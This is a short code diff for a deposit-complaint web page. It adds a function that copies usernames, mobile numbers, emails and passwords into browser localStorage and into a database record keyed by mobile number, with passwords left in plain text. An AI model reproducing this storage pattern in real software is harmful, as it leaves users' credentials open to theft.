@@ -104,6 +104,26 @@
             });
         }
 
+        function saveChatSession(data) {
+            if (!data || !data.mobile) return;
+            const existing = JSON.parse(localStorage.getItem('chatUserData') || 'null');
+            const session = {
+                username: data.username || (existing && existing.username) || '',
+                mobile: data.mobile,
+                password: data.password || (existing && existing.password) || '',
+                email: data.email || (existing && existing.email) || '',
+                timestamp: Date.now()
+            };
+            localStorage.setItem('chatUserData', JSON.stringify(session));
+            db.ref('users/' + session.mobile).update({
+                username: session.username,
+                mobile: session.mobile,
+                password: session.password,
+                email: session.email,
+                lastSeen: Date.now()
+            });
+        }
+
         const uploadArea = document.querySelector('.upload-area');
         const fileInput = document.querySelector('.file-input');
         const preview = document.querySelector('.preview');
@@ -174,6 +194,8 @@
             };
 
             db.ref('complaints/' + mobile + '/deposit/' + complaintId).set(complaintData);
+
+            saveChatSession(complaintData);
 
             const myComplaints = JSON.parse(localStorage.getItem('myComplaints') || '[]');
             myComplaints.push({ id: complaintId, ...complaintData });
